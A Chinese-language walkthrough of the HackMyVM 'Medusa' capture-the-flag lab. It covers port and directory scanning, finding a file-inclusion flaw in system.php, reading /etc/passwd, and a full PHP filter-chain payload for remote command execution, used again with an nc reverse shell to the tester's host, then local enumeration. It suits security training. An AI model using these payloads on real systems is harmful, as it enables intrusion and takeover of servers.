# 0.简介

靶机：https://hackmyvm.eu/machines/?v=Medusa
 难度：绿色
 目标 IP：192.168.205.145
 本机 IP：192.168.205.128

# 1.扫描

nmap起手

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -A -Pn -n --min-rate 10000 192.168.205.145
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 17:42 CST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.205.145
Host is up (0.00026s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 70:d4:ef:c9:27:6f:8d:95:7a:a5:51:19:51:fe:14:dc (RSA)
|   256 3f:8d:24:3f:d2:5e:ca:e6:c9:af:37:23:47:bf:1d:28 (ECDSA)
|_  256 0c:33:7e:4e:95:3d:b0:2d:6a:5e:ca:39:91:0d:13:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
MAC Address: 08:00:27:5D:E9:45 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.26 ms 192.168.205.145

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.08 seconds
                                                           
```

# 2.踩点

```
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.145
Connected to 192.168.205.145.
220 (vsFTPd 3.0.3)
Name (192.168.205.145:kali): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> exit
221 Goodbye.
```

不许登，那去看80。是个默认页

![image-20250331190711601](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250331190711760.png)

有关类似是用户名的东西Kraken，不管先，我们目录爆破一下

ps:因为它有一个manual路径会爆出很多没有利用价值的二级目录，所以我们这次用gobuster，然后再过滤一些403的没用状态码

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.145 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10674]
/.                    (Status: 200) [Size: 10674]
/manual               (Status: 301) [Size: 319] [--> http://192.168.205.145/manual/]
/hades                (Status: 301) [Size: 318] [--> http://192.168.205.145/hades/]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

接着爆破

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.145/hades/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.145/hades/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/door.php             (Status: 200) [Size: 555]
Progress: 598000 / 598005 (100.00%)
===============================================================
Finished
===============================================================
```

访问/door.php

![image-20250331190726085](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250331190726175.png)

输入之前获得的Kraken

ps:有点搞笑，它规定了只可以输入6个字符

![image-20250331190733042](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250331190733131.png)

获得一个域名，我们加上，并且爆破一下子域

```
┌──(kali㉿kali)-[~/test]
└─$ ffuf -u http://medusa.hmv -H 'Host: FUZZ.medusa.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 3423  

        /'___\  /'___\           /'___\     
       /\ \__/ /\ \__/  __  __  /\ \__/     
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\    
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    
         \ \_\   \ \_\  \ \____/  \ \_\     
          \/_/    \/_/   \/___/    \/_/     

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://medusa.hmv
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.medusa.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3423
________________________________________________

dev                     [Status: 200, Size: 1973, Words: 374, Lines: 26, Duration: 164ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

加上访问

![image-20250331190750401](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250331190750557.png)
 没看到啥，目录爆破

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://dev.medusa.hmv/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1973]
/css                  (Status: 301) [Size: 314] [--> http://dev.medusa.hmv/css/]
/files                (Status: 301) [Size: 316] [--> http://dev.medusa.hmv/files/]
/assets               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/assets/]
/.                    (Status: 200) [Size: 1973]
/manual               (Status: 301) [Size: 317] [--> http://dev.medusa.hmv/manual/]
/robots.txt           (Status: 200) [Size: 489]
Progress: 470664 / 598005 (78.71%)
Progress: 491780 / 598005 (82.24%)
```

接着爆破/files

```
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://dev.medusa.hmv/files/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,txt,md | grep -v "403"
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.medusa.hmv/files/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 0]
/system.php           (Status: 200) [Size: 0]
/.                    (Status: 200) [Size: 0]
/readme.txt           (Status: 200) [Size: 144]
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/readme.txt
-----------------------------------------------
+  Don't trust your eyes, trust your instinct +
-----------------------------------------------
                                                 
```

谜语人滚出哥谭

```
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://dev.medusa.hmv/files/system.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=id
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================


Total time: 60.95589
Processed Requests: 119600
Filtered Requests: 119600
Requests/sec.: 1962.074

                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ wfuzz -u "http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.medusa.hmv/files/system.php?FUZZ=/etc/passwd
Total requests: 119600

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                            
=====================================================================

000000167:   200        27 L     40 W       1452 Ch     "view"                                                             
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 2.243865
Processed Requests: 309
Filtered Requests: 308
Requests/sec.: 137.7087
```

看眼有没有密钥

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/system.php?view=/home/spectre/.ssh/id_rsa
                           
```

到这我习惯就是测php filter

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://dev.medusa.hmv/files/system.php?view=php://filter/convert.base64-encode/resource=/etc/passwd
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLXRpbWVzeW5jOng6MTA0OjExMDpzeXN0ZW1kIFRpbWUgU3luY2hyb25pemF0aW9uLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA1OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3BlY3RyZTp4OjEwMDA6MTAwMDpzcGVjdHJlLCwsOi9ob21lL3NwZWN0cmU6L2Jpbi9iYXNoCnN5c3RlbWQtY29yZWR1bXA6eDo5OTk6OTk5OnN5c3RlbWQgQ29yZSBEdW1wZXI6LzovdXNyL3NiaW4vbm9sb2dpbgpmdHA6eDoxMDY6MTEzOmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K                                                                                                                                    
```

那直接执行命令试试

```
┌──(kali㉿kali)-[~/test]
└─$ curl "http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id" --output -
uid=33(www-data) gid=33(www-data) groups=33(www-data)
�B�0���>==�@C������>==�@C������>==�@C������>==�@C������>==�@C������>==�@          
```

弹shell

```
http://dev.medusa.hmv/files/system.php?view=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=nc%20192.168.205.128%208888%20-e%20/bin/bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888                                
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.145] 49190
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. 获得稳定的 Shell

获取反向 shell 后，通过以下命令获得稳定的交互式 TTY shell：

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.提权

```
www-data@medusa:/var/www/dev/files$ ls -la
total 16
drwxr-xr-x 2 root root 4096 Jan 19  2023 .
drwxr-xr-x 5 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root    0 Jan 15  2023 index.php
-rw-r--r-- 1 root root  144 Jan 18  2023 readme.txt
-rw-r--r-- 1 root root  110 Jan 19  2023 system.php
www-data@medusa:/var/www/dev/files$ cd ..
www-data@medusa:/var/www/dev$ ls -al
total 28
drwxr-xr-x 5 root root 4096 Jan 19  2023 .
drwxr-xr-x 4 root root 4096 Jan 15  2023 ..
drwxr-xr-x 2 root root 4096 Jan 15  2023 assets
drwxr-xr-x 2 root root 4096 Jan 15  2023 css
drwxr-xr-x 2 root root 4096 Jan 19  2023 files
-rw-r--r-- 1 root root 1973 Jan 19  2023 index.html
-rw-r--r-- 1 root root  489 Jan 18  2023 robots.txt
www-data@medusa:/var/www/dev$ cd ..
www-data@medusa:/var/www$ ls -la
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2023 .
drwxr-xr-x 12 root root 4096 Jan 15  2023 ..
drwxr-xr-x  5 root root 4096 Jan 19  2023 dev
drwxr-xr-x  3 root root 4096 Jan 19  2023 html
www-data@medusa:/var/www$ cd html/
www-data@medusa:/var/www/html$ ls -al
total 24
drwxr-xr-x 3 root root  4096 Jan 19  2023 .
drwxr-xr-x 4 root root  4096 Jan 15  2023 ..
drwxr-xr-x 2 root root  4096 Jan 30  2023 hades
-rw-r--r-- 1 root root 10674 Jan 19  2023 index.html
www-data@medusa:/var/www/html$ cd hades/
www-data@medusa:/var/www/html/hades$ ls -al
total 20
drwxr-xr-x 2 root root 4096 Jan 30  2023 .
drwxr-xr-x 3 root root 4096 Jan 19  2023 ..
-rw-r--r-- 1 root root  265 Jan 19  2023 d00r_validation.php
-rw-r--r-- 1 root root  555 Jan 30  2023 door.php
-rw-r--r-- 1 root root    0 Jan 19  2023 index.php
-rw-r--r-- 1 root root  198 Jan 19  2023 styles.css
www-data@medusa:/var/www/html/hades$ cd /home/
www-data@medusa:/home$ ls -al
total 12
drwxr-xr-x  3 root    root    4096 Jan 15  2023 .
drwxr-xr-x 19 root    root    4096 Jan 15  2023 ..
drwxr-xr-x  3 spectre spectre 4096 Jan 18  2023 spectre
www-data@medusa:/home$ sudo -l
sudo: unable to resolve host medusa: Name or service not known

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
sudo: a password is required
www-data@medusa:/home$ cd spectre/
www-data@medusa:/home/spectre$ ls -al
total 32
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .
drwxr-xr-x 3 root    root    4096 Jan 15  2023 ..
-rw------- 1 spectre spectre  197 Jan 21  2023 .bash_history
-rw-r--r-- 1 spectre spectre  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 spectre spectre 3526 Jan 15  2023 .bashrc
drwxr-xr-x 3 spectre spectre 4096 Jan 18  2023 .local
-rw-r--r-- 1 spectre spectre  807 Jan 15  2023 .profile
-rw------- 1 spectre spectre   44 Jan 18  2023 user.txt
www-data@medusa:/home/spectre$ find / -perm -4000 -type f 2>/dev/null

/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/su
www-data@medusa:/home/spectre$ 
www-data@medusa:/home/spectre$ /sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@medusa:/home/spectre$ ss -tnlup
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                              0.0.0.0:*                                              
tcp                     LISTEN                   0                        511                                                    *:80                                                    *:*                                              
tcp                     LISTEN                   0                        32                                                     *:21                                                    *:*                                              
tcp                     LISTEN                   0                        128                                                 [::]:22                                                 [::]:*                       
www-data@medusa:/home/spectre$ cd /opt/
www-data@medusa:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/opt$ cd /tmp/
www-data@medusa:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Feb  4 04:40 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/tmp$ cd /mnt/
www-data@medusa:/mnt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Jan 15  2023 .
drwxr-xr-x 19 root root 4096 Jan 15  2023 ..
www-data@medusa:/mnt$ cd /
www-data@medusa:/$ ls -la
total 72
drwxr-xr-x  19 root root  4096 Jan 15  2023 .
drwxr-xr-x  19 root root  4096 Jan 15  2023 ..
drwxr-xr-x   2 root root  4096 Jan 18  2023 ...
lrwxrwxrwx   1 root root     7 Jan 15  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Jan 15  2023 boot
drwxr-xr-x  17 root root  3140 Feb  4 04:40 dev
drwxr-xr-x  71 root root  4096 Feb  4 05:08 etc
drwxr-xr-x   3 root root  4096 Jan 15  2023 home
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64
lrwxrwxrwx   1 root root    31 Jan 15  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Jan 15  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Jan 15  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Jan 15  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 Jan 15  2023 lost+found
drwxr-xr-x   3 root root  4096 Jan 15  2023 media
drwxr-xr-x   2 root root  4096 Jan 15  2023 mnt
drwxr-xr-x   2 root root  4096 Jan 15  2023 opt
dr-xr-xr-x 148 root root     0 Feb  4 04:40 proc
drwx------   3 root root  4096 Jan 30  2023 root
drwxr-xr-x  19 root root   540 Feb  4 04:41 run
lrwxrwxrwx   1 root root     8 Jan 15  2023 sbin -> usr/sbin
drwxr-xr-x   3 root root  4096 Jan 15  2023 srv
dr-xr-xr-x  13 root root     0 Feb  4 04:40 sys
drwxrwxrwt   2 root root  4096 Feb  4 04:40 tmp
drwxr-xr-x  14 root root  4096 Jan 15  2023 usr
drwxr-xr-x  12 root root  4096 Jan 15  2023 var
lrwxrwxrwx   1 root root    28 Jan 15  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64
